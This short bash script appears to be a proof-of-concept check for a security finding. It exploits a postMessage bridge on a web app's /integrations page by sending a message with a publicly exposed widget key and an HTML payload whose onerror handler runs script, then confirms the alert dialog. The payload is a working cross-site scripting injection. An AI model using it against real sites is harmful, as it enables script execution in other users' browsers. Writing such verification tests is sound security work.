#!/usr/bin/env bash
# POSTMSG-003 (CWE-79/CWE-346): the widget bridge on /integrations trusts a
# message because it carries WIDGET_APP_KEY - a constant that ships in the
# public bundle - instead of checking where it came from, then renders the
# payload as HTML. The key below is read straight out of the served chunk.
set -e; . "$(dirname "$0")/_lib.sh"
M="POSTMSG-WIDGET-PROVEN-7f3a"
KEY="wgt_live_7f3a9c21"
JS="window.postMessage({type:'taskflow:widget',appKey:'$KEY',html:\"<img src=x onerror=alert('$M')>\"},'*'); await new Promise(function(r){setTimeout(r,1500);}); return 'sent';"
browser_dialog "$TARGET/integrations" "$M" --eval "$JS"
